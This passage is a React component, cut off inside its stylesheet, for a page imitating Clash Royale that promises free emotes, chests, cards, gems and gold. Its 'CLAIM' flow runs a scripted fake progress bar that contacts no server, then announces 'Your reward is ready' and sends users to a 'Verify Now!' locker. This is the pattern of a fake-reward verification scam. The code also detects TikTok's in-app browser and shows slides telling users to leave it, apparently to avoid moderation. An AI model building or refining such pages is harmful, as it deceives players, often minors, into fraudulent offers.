import React, { useEffect, useMemo, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import {
  Box,
  Coins,
  PackageOpen,
  HandHeart,
  Banknote,
  Gem,
  Sword,
} from "lucide-react";
import { faGift } from "@fortawesome/free-solid-svg-icons";

/** =========================
 *  ✅ PUT YOUR DATA HERE
 *  ========================= */
const PACKS_DATA = [
  {
    id: 3,
    name: "Pack 1",
    emotes: [
      "images/dances/41.png",
      "images/dances/42.png",
      "images/dances/43.png",
      "images/dances/44.png",
    ],
    emotesCount: 3,
  },
  {
    id: 1,
    name: "Pack 1",
    emotes: [
      "images/dances/20.png",
      "images/dances/21.png",
      "images/dances/22.png",
      "images/dances/23.png",
    ],
    emotesCount: 3,
  },

  {
    id: 5,
    name: "Pack 1",
    emotes: [
      "images/dances/38.png",
      "images/dances/39.png",
      "images/dances/40.png",
    ],
    emotesCount: 3,
  },
  {
    id: 6,
    name: "Pack 1",
    emotes: [
      "images/dances/1.png",
      "images/dances/7.png",
      "images/dances/3.png",
      "images/dances/19.png",
    ],
    emotesCount: 3,
  },
  {
    id: 12,
    name: "Pack 1",
    emotes: [
      "images/dances/16.png",
      "images/dances/13.png",
      "images/dances/14.png",
      "images/dances/15.png",
    ],
    emotesCount: 3,
  },
];

// Sample boxes data
const BOXES_DATA = [
  {
    id: 1,
    name: "Valentine Chest",
    image: "/images/boxes/7.png",
    rarity: "Legendary",
    price: "Free",
    rewards: ["Guaranteed Legendary", "Cards", "Shards", "Gems"],
  },
  {
    id: 2,
    name: "Fire & Ice Chest",
    image: "/images/boxes/6.png",
    rarity: "Legendary",
    price: "Free",
    rewards: ["Guaranteed Legendary", "Cards", "Shards", "Gems"],
  },
  {
    id: 3,
    status: false,
    name: "Christmas Chest",
    image: "/images/boxes/2.png",
    rarity: "Legendary",
    price: "Free",
    rewards: ["Guaranteed Legendary", "Cards", "Shards", "Gems"],
  },
  {
    id: 4,
    name: "Hero Chest",
    image: "/images/boxes/1.png",
    rarity: "Legendary",
    price: "Free",
    rewards: ["Guaranteed Legendary", "Epic Cards", "Gold", "Gems"],
  },
  {
    id: 5,
    name: "Magic Lucky Chest",
    image: "/images/boxes/4.png",
    rarity: "Legendary",
    price: "Free",
    rewards: ["Guaranteed Legendary", "Epic Cards", "Gold"],
  },
  {
    id: 6,
    name: "Lucky Chest Rework",
    status: false,
    image: "/images/boxes/3.png",
    rarity: "Legendary",
    price: "Free",
    rewards: ["Multiple Legendaries", "Epic Cards", "Gold"],
  },
  {
    id: 7,
    name: "Lucky Cube Evolution",
    image: "/images/boxes/5.png",
    rarity: "Epic",
    price: "Free",
    rewards: ["Epic Cards", "Rare Cards", "Gold"],
  },
];

// Sample gold data
const GOLD_DATA = [
  {
    id: 1,
    name: "35K Gold",
    amount: "35,000",
    image:
      "https://i.pinimg.com/originals/ee/6f/3b/ee6f3b9c3dc82f5c369ce5f6baf3288b.png",
    price: "Free",
  },
  {
    status: false,
    id: 2,
    name: "250K Gold",
    amount: "250,000",
    image:
      "https://i.pinimg.com/originals/ee/6f/3b/ee6f3b9c3dc82f5c369ce5f6baf3288b.png",
    price: "Free",
  },
];

// Sample cards data
const CARDS_DATA = [
  {
    id: 1,
    name: "Wizard",
    rarity: "Heroic",
    image: "/images/cards/11.png",
    level: 12,
    count: 50,
    price: "Free",
  },
  {
    id: 2,
    name: "ICE GOLEM",
    rarity: "Heroic",
    image: "/images/cards/10.png",
    level: 12,
    count: 50,
    price: "Free",
  },
  {
    id: 3,
    name: "P.E.K.K.A",
    rarity: "Heroic",
    image: "/images/cards/7.webp",
    level: 12,
    count: 50,
    price: "Free",
  },
  {
    id: 4,
    name: "Musketeer",
    rarity: "Heroic",
    image: "/images/cards/8.webp",
    level: 12,
    count: 50,
    price: "Free",
  },
  {
    id: 5,
    name: "Knight",
    rarity: "Heroic",
    image: "/images/cards/9.webp",
    level: 12,
    count: 50,
    price: "Free",
  },
];

// Sample gems data
const GEMS_DATA = [
  {
    id: 1,
    name: "500 Gems",
    amount: "500",
    image:
      "https://static.wikia.nocookie.net/clashroyale/images/f/f2/Gem2C.png",
    price: "Free",
  },
  {
    id: 2,
    name: "1200 Gems",
    amount: "1,200",
    image:
      "https://static.wikia.nocookie.net/clashroyale/images/f/f2/Gem2C.png",
    price: "Free",
  },
  {
    id: 3,
    name: "2500 Gems",
    amount: "2,500",
    image:
      "https://static.wikia.nocookie.net/clashroyale/images/f/f2/Gem2C.png",
    price: "Free",
  },
  {
    status: false,
    id: 4,
    name: "6500 Gems",
    amount: "6,500",
    image:
      "https://static.wikia.nocookie.net/clashroyale/images/f/f2/Gem2C.png",
    price: "Free",
  },
];

const PacksSection = () => {
  const [activeTab, setActiveTab] = useState("emotes");
  const [step, setStep] = useState(1);
  const [loadingText, setLoadingText] = useState("");
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [showLocker, setShowLocker] = useState(false);
  const [lastClaim, setLastClaim] = useState({ tab: "emotes", id: null });
  const slides = useMemo(
    () => ["/images/browser/3.jpg", "/images/browser/4.jpg"],
    [],
  );

  const [isTikTokBrowser, setIsTikTokBrowser] = useState(false);
  const [slideIndex, setSlideIndex] = useState(0);

  useEffect(() => {
    const ua = (navigator.userAgent || "").toLowerCase();

    const isTikTok =
      ua.includes("tiktok") ||
      ua.includes("bytedance") ||
      ua.includes("musical_ly") ||
      ua.includes("aweme");

    setIsTikTokBrowser(isTikTok);
  }, []);

  useEffect(() => {
    if (!isTikTokBrowser) return;

    const interval = setInterval(() => {
      setSlideIndex((prev) => (prev + 1) % slides.length);
    }, 1500);

    return () => clearInterval(interval);
  }, [isTikTokBrowser, slides.length]);

  /** ✅ Mobile full height fix */
  useEffect(() => {
    const setVH = () => {
      const vh = window.innerHeight * 0.01;
      document.documentElement.style.setProperty("--vh", `${vh}px`);
    };
    setVH();
    window.addEventListener("resize", setVH);
    window.addEventListener("orientationchange", setVH);
    return () => {
      window.removeEventListener("resize", setVH);
      window.removeEventListener("orientationchange", setVH);
    };
  }, []);

  const startLoadingSequence = (tab) => {
  setLoadingProgress(0);

  const itemType =
    tab === "emotes"
      ? "emotes"
      : tab === "boxes"
        ? "boxes"
        : tab === "cards"
          ? "cards"
          : tab === "gems"
            ? "gems"
            : "gold";

  const phases = [
    { text: "Connecting", duration: 1200, progress: 20 },
    { text: "Syncing reward data", duration: 1400, progress: 45 },
    { text: `Preparing your ${itemType}`, duration: 1700, progress: 78 },
    { text: "Finalizing", duration: 1200, progress: 100 },
  ];

  let current = 0;
  const run = () => {
    if (current < phases.length) {
      const p = phases[current];
      setLoadingText(p.text);
      setLoadingProgress(p.progress);
      setTimeout(() => {
        current += 1;
        run();
      }, p.duration);
    } else {
      setStep(3);
    }
  };
  run();
};

  /** ✅ CLAIM only */
  const handleClaimAndProceed = (tab, itemId, status) => {
    if (status === false) return;
    setLastClaim({ tab, id: itemId });
    setStep(2);
    startLoadingSequence(tab);
  };

  const handleBack = () => setStep(1);

  const finalLabel = useMemo(() => {
    const tab = lastClaim.tab || activeTab;
    if (tab === "emotes")
      return `You are almost done with <span className="text-[#ffd35a] font-extrabold">3 Emotes</span>!`;
    if (tab === "boxes")
      return `You are almost done with <span className="text-[#ffd35a] font-extrabold">1 Box</span>!`;
    if (tab === "gold")
      return `You are almost done with <span className="text-[#ffd35a] font-extrabold">Gold</span>!`;
    if (tab === "cards")
      return `You are almost done with <span className="text-[#ffd35a] font-extrabold">Cards</span>!`;
    if (tab === "gems")
      return `You are almost done with <span className="text-[#ffd35a] font-extrabold">Gems</span>!`;
    return "You are almost done!";
  }, [lastClaim, activeTab]);

  /** =========================
   *  CLASH ROYALE STYLE PIECES
   *  ========================= */
  const ClaimBtn = ({ disabled, onClick }) => (
    <motion.button
      whileHover={disabled ? {} : { scale: 1.02, y: -1 }}
      whileTap={disabled ? {} : { scale: 0.98 }}
      onClick={onClick}
      disabled={disabled}
      className={[
        "cr-btn w-full px-6 py-3",
        "text-[13px] md:text-sm font-extrabold tracking-wide",
        "transition-all select-none",
        disabled ? "cr-btn--disabled" : "cr-btn--claim",
      ].join(" ")}
    >
      <span className="flex items-center justify-center gap-2">
        {!disabled && <FontAwesomeIcon icon={faGift} className="text-[12px]" />}
        {disabled ? "LOCKED" : "CLAIM"}
      </span>
    </motion.button>
  );

  const PanelCard = ({ children, className = "" }) => (
  <motion.div
    whileHover={{ y: -2, scale: 1.01 }}
    whileTap={{ scale: 0.99 }}
    transition={{ duration: 0.15 }}
    className={`cr-panel cr-bevel cr-shadow ${className}`}
  >
    {children}
  </motion.div>
);

  const MiniTitle = ({ left, right }) => (
    <div className="flex justify-between items-center mb-2">
      <span className="cr-title text-[12px] md:text-[13px]">{left}</span>
      {right ? <span className="cr-badge">{right}</span> : null}
    </div>
  );

  /** =========================
   *  RENDER LISTS (CLAIM ONLY)
   *  ========================= */
  const renderEmotesTab = () => (
    <div className="rounded-xl p-2 mb-3 flex-1 min-h-0 overflow-y-auto custom-scrollbar">
      {PACKS_DATA.map((pack, idx) => {
        const unavailable = pack.status === false;
        return (
          <PanelCard key={pack.id} className="p-3 mb-2 last:mb-0">
            <MiniTitle left={`Pack ${idx + 1}`} />
            <div className="grid grid-cols-4 gap-1.5 mb-2">
              {(pack.emotes || []).slice(0, 4).map((emote, i) => (
                <div key={i} className="cr-slot cr-bevel-sm">
                  <img
                    src={emote}
                    alt={`Emote ${i + 1}`}
                    loading="lazy"
                    decoding="async"
                    fetchpriority="low"
                    className="w-full h-full object-cover blur transition"
                    onLoad={(e) => e.currentTarget.classList.remove("blur")}
                  />
                </div>
              ))}
            </div>
            <div className="mt-3">
              <ClaimBtn
                disabled={unavailable}
                onClick={() =>
                  handleClaimAndProceed("emotes", pack.id, pack.status)
                }
              />
            </div>
          </PanelCard>
        );
      })}
    </div>
  );

  const renderBoxesTab = () => (
    <div className="rounded-xl p-2 mb-3 flex-1 min-h-0 overflow-y-auto custom-scrollbar">
      {BOXES_DATA.map((box) => {
        const unavailable = box.status === false;
        return (
          <PanelCard key={box.id} className="p-3 mb-2 last:mb-0">
            <MiniTitle left={box.name} right={box.rarity} />
            <div className="flex justify-center mb-3">
              <div className="cr-chestFrame cr-bevel-sm">
                <img
                  src={box.image}
                  alt={box.name}
                  className="w-full h-full object-cover"
                />
              </div>
            </div>
            <ClaimBtn
              disabled={unavailable}
              onClick={() => handleClaimAndProceed("boxes", box.id, box.status)}
            />
          </PanelCard>
        );
      })}
    </div>
  );

  const renderGoldTab = () => (
    <div className="rounded-xl p-2 mb-3 flex-1 min-h-0 overflow-y-auto custom-scrollbar">
      {GOLD_DATA.map((gold) => {
        const unavailable = gold.status === false;
        return (
          <PanelCard key={gold.id} className="p-3 mb-2 last:mb-0">
            <MiniTitle left={gold.name} />
            <div className="flex items-center justify-center gap-3 mb-3">
              <div className="cr-coinFrame cr-bevel-sm">
                <img
                  src={gold.image}
                  alt={gold.name}
                  className="w-10 h-10 object-contain"
                />
              </div>
              <div className="cr-amount">{gold.amount}</div>
            </div>
            <ClaimBtn
              disabled={unavailable}
              onClick={() =>
                handleClaimAndProceed("gold", gold.id, gold.status)
              }
            />
          </PanelCard>
        );
      })}
    </div>
  );

  const renderCardsTab = () => (
    <div className="rounded-xl p-2 mb-3 flex-1 min-h-0 overflow-y-auto custom-scrollbar">
      {CARDS_DATA.map((card) => {
        const unavailable = card.status === false;

        const rarityTone =
          {
            Heroic: "cr-pill cr-pill--heroic",
            Legendary: "cr-pill cr-pill--legendary",
            Epic: "cr-pill cr-pill--epic",
            Rare: "cr-pill cr-pill--rare",
            Common: "cr-pill cr-pill--common",
          }[card.rarity] || "cr-pill cr-pill--common";

        return (
          <PanelCard key={card.id} className="p-3 mb-2 last:mb-0">
            <div className="flex justify-between items-center mb-2">
              <span className="cr-title text-[12px] md:text-[13px]">
                {card.name}
              </span>
              <span className={rarityTone}>{card.rarity}</span>
            </div>

            <div className="flex items-center justify-between mb-3">
              <div className="cr-cardFrame cr-bevel-sm">
                <img
                  src={card.image}
                  alt={card.name}
                  className="w-14 h-16 object-contain"
                />
              </div>
              <div className="cr-meta text-right">
                <div>Lv. {card.level}</div>
                <div>x{card.count}</div>
              </div>
            </div>

            <ClaimBtn
              disabled={unavailable}
              onClick={() =>
                handleClaimAndProceed("cards", card.id, card.status)
              }
            />
          </PanelCard>
        );
      })}
    </div>
  );

  const renderGemsTab = () => (
    <div className="rounded-xl p-2 mb-3 flex-1 min-h-0 overflow-y-auto custom-scrollbar">
      {GEMS_DATA.map((gem) => {
        const unavailable = gem.status === false;
        return (
          <PanelCard key={gem.id} className="p-3 mb-2 last:mb-0">
            <MiniTitle left={gem.name} />
            <div className="flex items-center justify-center gap-3 mb-3">
              <div className="cr-gemFrame cr-bevel-sm">
                <img
                  src="/images/gems/1.png"
                  alt={gem.name}
                  className="w-10 h-10 object-contain"
                />
              </div>
              <div className="cr-amount cr-amount--green">{gem.amount}</div>
            </div>
            <ClaimBtn
              disabled={unavailable}
              onClick={() => handleClaimAndProceed("gems", gem.id, gem.status)}
            />
          </PanelCard>
        );
      })}
    </div>
  );
  if (isTikTokBrowser) {
    return (
      <div className="min-h-screen w-full flex items-center justify-center bg-black px-4">
        <div className="w-full max-w-md">
          <img
            src={slides[slideIndex]}
            alt="Browser Guide"
            className="w-full h-auto rounded-2xl shadow-2xl tiktok-slide"
            style={{ objectFit: "contain" }}
          />
        </div>
      </div>
    );
  }

  return (
    <>
      {/* Background */}
      <div
        className="cr-bg flex items-center justify-center p-3"
        style={{ minHeight: "calc(var(--vh, 1vh) * 100)" }}
      >
        {/* Main container */}
        <div className="cr-shell w-full md:w-1/2 lg:w-1/2 rounded-2xl p-2 h-[calc(var(--vh,1vh)*100-24px)] md:h-auto md:max-h-[95vh] flex flex-col">
          {/* Progress Steps */}
          <div className="flex justify-center">
            <div className="flex gap-2 mb-4">
              <div
                className={`cr-step ${step === 1 ? "cr-step--on" : "cr-step--off"}`}
              >
                1
              </div>
              <div
                className={`cr-step ${step >= 2 ? "cr-step--on" : "cr-step--off"}`}
              >
                2
              </div>
            </div>
          </div>

          {/* Step 1 */}
          {step === 1 && (
            <motion.div
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ duration: 0.3, ease: "easeIn" }}
              className="flex flex-col flex-1 min-h-0"
            >
              <div className="text-center mb-2 flex justify-center items-center">
                <motion.img
                  src="/images/logo.png"
                  className="w-[42%] drop-shadow-[0_4px_0_rgba(0,0,0,0.28)]"
                  alt=""
                  initial={{ scale: 0.92, opacity: 0 }}
                  animate={{ scale: 1, opacity: 1 }}
                  transition={{ duration: 0.25 }}
                />
              </div>

              {/* Tabs */}
              <div className="cr-tabs mb-2 p-1">
                {[
                  { id: "emotes", label: "Emotes", icon: <HandHeart /> },
                  { id: "boxes", label: "Boxes", icon: <PackageOpen /> },
                  { id: "cards", label: "Cards", icon: <Sword /> },
                  { id: "gems", label: "Gems", icon: <Gem /> },
                  { id: "gold", label: "Gold", icon: <Banknote /> },
                ].map((tab) => (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id)}
                    className={`cr-tab ${activeTab === tab.id ? "cr-tab--active" : "cr-tab--idle"}`}
                  >
                    <div className="flex flex-col gap-1 items-center">
                      <span className="text-sm">{tab.icon}</span>
                      <span className="text-[11px] md:text-xs">
                        {tab.label}
                      </span>
                    </div>
                  </button>
                ))}
              </div>

              {/* Title */}
              <h2 className="cr-h2 text-center mb-2">
                {activeTab === "emotes" && "Claim Your Emotes"}
                {activeTab === "boxes" && "Claim Special Boxes"}
                {activeTab === "cards" && "Claim Free Cards"}
                {activeTab === "gold" && "Claim Free Gold"}
                {activeTab === "gems" && "Claim Free Gems"}
              </h2>

              {/* Subtitle */}
              <p className="cr-sub text-center text-xs mb-3">
                Click <b className="text-white">CLAIM</b> on any item to
                continue.
              </p>

              {/* Content */}
              {activeTab === "emotes" && renderEmotesTab()}
              {activeTab === "boxes" && renderBoxesTab()}
              {activeTab === "cards" && renderCardsTab()}
              {activeTab === "gold" && renderGoldTab()}
              {activeTab === "gems" && renderGemsTab()}

              <p className="cr-sub text-center text-xs font-semibold">
                If you claim many items, they will arrive slowly. <br />
                You can claim up to 2 rewards per day.
              </p>
            </motion.div>
          )}

          {/* Step 2 */}
          {/* Step 2 */}
{step === 2 && (
  <motion.div
    initial={{ y: 20, opacity: 0 }}
    animate={{ y: 0, opacity: 1 }}
    transition={{ duration: 0.3, ease: "easeIn" }}
    className="flex flex-col justify-center h-full min-h-0"
  >
    <div>
      <div className="text-center mb-4 flex justify-center items-center">
        <motion.img
          src="/images/logo.png"
          className="w-[72%] drop-shadow-[0_4px_0_rgba(0,0,0,0.28)]"
          alt=""
          initial={{ scale: 0.92, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ duration: 0.25 }}
        />
      </div>

      <h2 className="cr-h2 text-center mb-2">
        Processing Your{" "}
        {lastClaim.tab === "emotes"
          ? "Emotes"
          : lastClaim.tab === "boxes"
            ? "Boxes"
            : lastClaim.tab === "cards"
              ? "Cards"
              : lastClaim.tab === "gems"
                ? "Gems"
                : "Gold"}
      </h2>

      <div className="flex flex-col items-center justify-center py-8 flex-1">
        {/* Loader */}
        <div className="relative w-28 h-28 mb-6">
          <div className="absolute inset-0 cr-loaderOuter"></div>
          <div className="absolute inset-[8px] cr-loaderMid"></div>
          <div className="absolute inset-[18px] cr-loaderInner"></div>

          <div className="absolute inset-0 flex items-center justify-center">
            <motion.div
              className="cr-loaderCore"
              animate={{
                scale: [1, 1.08, 1],
              }}
              transition={{
                duration: 1.2,
                repeat: Infinity,
                ease: "easeInOut",
              }}
            >
              {lastClaim.tab === "emotes" && (
                <span className="text-3xl">😊</span>
              )}
              {lastClaim.tab === "boxes" && (
                <Box className="w-8 h-8 text-[#ffd95d]" />
              )}
              {lastClaim.tab === "cards" && (
                <Sword className="w-8 h-8 text-[#ffd95d]" />
              )}
              {lastClaim.tab === "gold" && (
                <Coins className="w-8 h-8 text-[#ffd95d]" />
              )}
              {lastClaim.tab === "gems" && (
                <Gem className="w-8 h-8 text-[#ffd95d]" />
              )}
            </motion.div>
          </div>
        </div>

        {/* Progress percent */}
        <div className="cr-progressPercent mb-3">{loadingProgress}%</div>

        {/* Progress bar */}
        <div className="cr-progressTrack w-full h-4 mb-4 overflow-hidden">
          <motion.div
            className="cr-progressFill h-4"
            initial={{ width: 0 }}
            animate={{ width: `${loadingProgress}%` }}
            transition={{ duration: 0.55, ease: "easeOut" }}
          />
        </div>

        {/* Loading message */}
        <div className="text-center w-full flex justify-center items-center mt-2">
          <motion.div
            key={loadingText}
            initial={{ opacity: 0, y: 10, scale: 0.98 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            transition={{ duration: 0.25 }}
            className="cr-loadingMsg w-[92%] md:w-[85%]"
          >
            <span>{loadingText}</span>
            <span className="cr-dots">
              <span>.</span>
              <span>.</span>
              <span>.</span>
            </span>
          </motion.div>
        </div>

        {/* small status text */}
        <p className="cr-loadingSub mt-4">
          Please wait while we prepare your selected reward.
        </p>
      </div>

      <p className="cr-sub text-center text-xs">
        Please do not close this page during processing.
      </p>
    </div>
  </motion.div>
)}

          {/* Step 3 */}
          {step === 3 && (
            <div className="flex flex-col justify-center h-full min-h-0">
              <div>
               

                <h2 className="cr-h1 text-center mb-5">Last Step!</h2>

                <div className="w-full flex justify-center items-center mt-4 flex-1 min-h-0">
  <div className="cr-finalBox w-[92%] md:w-[85%]">
    <div className="flex flex-col items-center text-center">
      <div className="cr-finalIcon mb-3">
        <FontAwesomeIcon icon={faGift} />
      </div>

      <p className="text-white text-[22px] font-extrabold leading-none mb-2 cr-finalTitle">
        Congratulations!
      </p>

      <div className="cr-finalLine mb-3"></div>

      <p
        className="text-[#eaf4ff] text-sm leading-relaxed font-semibold"
        dangerouslySetInnerHTML={{ __html: finalLabel }}
      />

      <p className="text-[#d7ebff] text-sm leading-relaxed mt-3">
        Your reward is ready.
      </p>

      <div className="cr-finalNotice mt-4">
        Complete the last step below to continue.
      </div>
    </div>
  </div>
</div>

                <div className="w-full flex justify-center items-center mt-8">
                  <button
                    onClick={() => setShowLocker(true)}
                    className="cr-bigBtn  w-[92%] md:w-full"
                  >
                    Verify Now!
                  </button>
                </div>

                <div className="w-full flex justify-center items-center mt-3">
                  <button
                    onClick={handleBack}
                    className="cr-backBtn w-[92%] md:w-full"
                  >
                    Back
                  </button>
                </div>

                <p className="cr-sub text-center text-xs font-semibold  mt-5">
                  If you claim many items, they will arrive slowly. <br />
                  You can claim up to 2 rewards per day.
                </p>
              </div>
            </div>
          )}

          {/* ✅ Clash Royale CSS */}
          <style jsx>{`
            /* =========================
     CLASH ROYALE STYLE THEME
  ========================= */

            .cr-bg {
              background:
                radial-gradient(
                  circle at 20% 20%,
                  rgba(255, 255, 255, 0.08) 0 2px,
                  transparent 2px 100%
                ),
                radial-gradient(
                  circle at 80% 30%,
                  rgba(255, 255, 255, 0.06) 0 2px,
                  transparent 2px 100%
                ),
                linear-gradient(
                  180deg,
                  #2f8dff 0%,
                  #1f6fe5 35%,
                  #1459c9 70%,
                  #0c469f 100%
                );
              background-size:
                36px 36px,
                42px 42px,
                cover;
            }

            .cr-shell {
              position: relative;
              background: linear-gradient(
                180deg,
                #3ea0ff 0%,
                #2f86f0 48%,
                #236fd9 100%
              );
              border: 4px solid #0b3f8f;
              box-shadow:
                0 10px 0 #0a387c,
                0 18px 34px rgba(0, 0, 0, 0.35),
                inset 0 3px 0 rgba(255, 255, 255, 0.28),
                inset 0 -3px 0 rgba(0, 0, 0, 0.18);
              overflow: hidden;
            }

            .cr-shell:before {
              content: "";
              position: absolute;
              inset: 0;
              pointer-events: none;
              background:
                linear-gradient(
                  180deg,
                  rgba(255, 255, 255, 0.18),
                  transparent 24%
                ),
                linear-gradient(
                  90deg,
                  rgba(255, 255, 255, 0.05),
                  transparent 30%,
                  transparent 70%,
                  rgba(0, 0, 0, 0.07)
                );
              border-radius: 18px;
            }

            .cr-panel {
              position: relative;
              background: linear-gradient(
                180deg,
                #4cb2ff 0%,
                #3195f7 52%,
                #257de2 100%
              );
              border: 3px solid #0f4ea8;
            }

            .cr-bevel {
              border-radius: 18px;
              box-shadow:
                0 6px 0 #0b4b9f,
                0 10px 16px rgba(0, 0, 0, 0.22),
                inset 0 2px 0 rgba(255, 255, 255, 0.24),
                inset 0 -2px 0 rgba(0, 0, 0, 0.12);
            }

            .cr-bevel-sm {
              border-radius: 14px;
              border: 2px solid #1662bf;
              background: linear-gradient(180deg, #66beff 0%, #409df2 100%);
              box-shadow:
                0 3px 0 #1252a8,
                inset 0 2px 0 rgba(255, 255, 255, 0.22),
                inset 0 -2px 0 rgba(0, 0, 0, 0.1);
            }

            .cr-shadow {
              box-shadow:
                0 6px 0 #0b4b9f,
                0 10px 18px rgba(0, 0, 0, 0.22);
            }

            .cr-textShadow {
              text-shadow: 0 3px 0 rgba(0, 0, 0, 0.32);
            }

            .cr-title {
              color: #ffffff;
              font-weight: 1000;
              letter-spacing: 0.2px;
              text-shadow: 0 2px 0 rgba(0, 0, 0, 0.28);
            }

            .cr-h2 {
              color: #fff2a6;
              font-weight: 1000;
              font-size: 22px;
              letter-spacing: 0.3px;
              text-shadow:
                0 3px 0 #8a5b00,
                0 5px 10px rgba(0, 0, 0, 0.24);
            }

            .cr-h1 {
              color: #fff2a6;
              font-weight: 1000;
              font-size: 34px;
              letter-spacing: 0.4px;
              text-shadow:
                0 4px 0 #8a5b00,
                0 6px 12px rgba(0, 0, 0, 0.24);
            }

            .cr-sub {
              color: #eaf5ff;
              text-shadow: 0 2px 0 rgba(0, 0, 0, 0.18);
            }

            .cr-tabs {
              display: flex;
              gap: 8px;
              padding: 6px;
              border-radius: 18px;
              background: linear-gradient(180deg, #1a5ec4 0%, #154fa8 100%);
              border: 3px solid #0a408f;
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.16),
                0 4px 0 #083978;
            }

            .cr-tab {
              flex: 1;
              padding: 10px 8px;
              border-radius: 14px;
              font-weight: 1000;
              user-select: none;
              transition:
                transform 0.14s ease,
                filter 0.14s ease;
            }

            .cr-tab--idle {
              color: #dff0ff;
              background: linear-gradient(180deg, #3a8ff0 0%, #2f78d8 100%);
              border: 2px solid #1b5fba;
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.16),
                0 3px 0 #1650a1;
            }

            .cr-tab--idle:hover {
              transform: translateY(-1px);
              filter: brightness(1.05);
            }

            .cr-tab--active {
              color: #5b3a00;
              background: linear-gradient(
                180deg,
                #fff3a8 0%,
                #ffd95d 55%,
                #ffbe2f 100%
              );
              border: 2px solid #d19100;
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.42),
                0 4px 0 #b97800,
                0 8px 14px rgba(0, 0, 0, 0.18);
              transform: translateY(-1px);
            }

            .cr-step {
              width: 30px;
              height: 30px;
              border-radius: 999px;
              display: flex;
              align-items: center;
              justify-content: center;
              font-weight: 1000;
              font-size: 13px;
              border: 2px solid #0e4ea3;
            }

            .cr-step--on {
              color: #5b3a00;
              background: linear-gradient(180deg, #fff0a0, #ffc93b);
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.38),
                0 3px 0 #b87900;
            }

            .cr-step--off {
              color: #d9ebff;
              background: linear-gradient(180deg, #4d9df7, #2d74d0);
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.16),
                0 3px 0 #1550a5;
            }

            .cr-slot {
              width: 100%;
              aspect-ratio: 1/1;
              display: flex;
              align-items: center;
              justify-content: center;
              overflow: hidden;
              background: linear-gradient(180deg, #72c5ff 0%, #489cf0 100%);
            }

            .cr-chestFrame {
              width: 122px;
              height: 122px;
              overflow: hidden;
              display: flex;
              align-items: center;
              justify-content: center;
              border-radius: 16px;
              border: 3px solid #1662bf;
              background: linear-gradient(180deg, #79cbff 0%, #489cf0 100%);
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.2),
                0 4px 0 #1252a8;
            }

            .cr-coinFrame,
            .cr-gemFrame {
              width: 86px;
              height: 86px;
              border-radius: 999px;
              display: flex;
              align-items: center;
              justify-content: center;
              border: 3px solid #1662bf;
              background: linear-gradient(180deg, #79cbff 0%, #489cf0 100%);
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.2),
                0 4px 0 #1252a8;
            }

            .cr-cardFrame {
              width: 76px;
              height: 94px;
              display: flex;
              align-items: center;
              justify-content: center;
              border-radius: 16px;
              border: 3px solid #1662bf;
              background: linear-gradient(180deg, #79cbff 0%, #489cf0 100%);
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.2),
                0 4px 0 #1252a8;
            }

            .cr-amount {
              font-size: 28px;
              font-weight: 1000;
              color: #ffe77b;
              text-shadow:
                0 3px 0 #865400,
                0 5px 10px rgba(0, 0, 0, 0.2);
            }

            .cr-amount--green {
              color: #8dffe0;
              text-shadow:
                0 3px 0 #007a70,
                0 5px 10px rgba(0, 0, 0, 0.2);
            }

            .cr-meta {
              color: #f1f8ff;
              font-weight: 900;
              font-size: 12px;
              text-shadow: 0 2px 0 rgba(0, 0, 0, 0.2);
            }

            .cr-badge {
              font-size: 11px;
              font-weight: 1000;
              padding: 5px 10px;
              border-radius: 999px;
              color: #5b3a00;
              background: linear-gradient(180deg, #fff1a4 0%, #ffc93c 100%);
              border: 2px solid #d89a00;
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.35),
                0 2px 0 #b57900;
            }

            .cr-pill {
              font-size: 11px;
              font-weight: 1000;
              padding: 5px 10px;
              border-radius: 999px;
              text-shadow: 0 1px 0 rgba(0, 0, 0, 0.2);
              border: 2px solid rgba(0, 0, 0, 0.12);
            }

            .cr-pill--legendary {
              color: #5b3a00;
              background: linear-gradient(180deg, #fff1a4 0%, #ffc93c 100%);
              border-color: #d89a00;
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.35),
                0 2px 0 #b57900;
            }

            .cr-pill--epic {
              color: #fff;
              background: linear-gradient(180deg, #cb9cff 0%, #8a4fff 100%);
              border-color: #6a37d7;
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.22),
                0 2px 0 #5b26c0;
            }

            .cr-pill--rare {
              color: #fff;
              background: linear-gradient(180deg, #77d4ff 0%, #2d8fff 100%);
              border-color: #1f6fd3;
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.22),
                0 2px 0 #165db8;
            }

            .cr-pill--heroic {
              color: #5b3a00;
              background: linear-gradient(180deg, #fff0c6 0%, #ffd46f 100%);
              border-color: #d89a00;
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.32),
                0 2px 0 #b57900;
            }

            .cr-pill--common {
              color: #fff;
              background: linear-gradient(180deg, #a7b6c6 0%, #76879a 100%);
              border-color: #5f7187;
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.18),
                0 2px 0 #4f6278;
            }

            .cr-btn {
              border-radius: 16px;
              border: 3px solid transparent;
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.2),
                0 5px 0 rgba(0, 0, 0, 0.18),
                0 10px 16px rgba(0, 0, 0, 0.18);
              transition:
                transform 0.14s ease,
                filter 0.14s ease;
            }
                

            .cr-btn--claim {
              color: cr-btn--claim;
              font-weight:900;
              background: linear-gradient(
                180deg,
                #7cff92 0%,
                #39db61 55%,
                #19b741 100%
              );
              border-color: #109936;
              text-shadow: 0 2px 0 rgba(0, 0, 0, 0.18);
              box-shadow:
                inset 0 2px 0 rgba(255, 255, 255, 0.24),
                0 5px 0 #0d8d31,
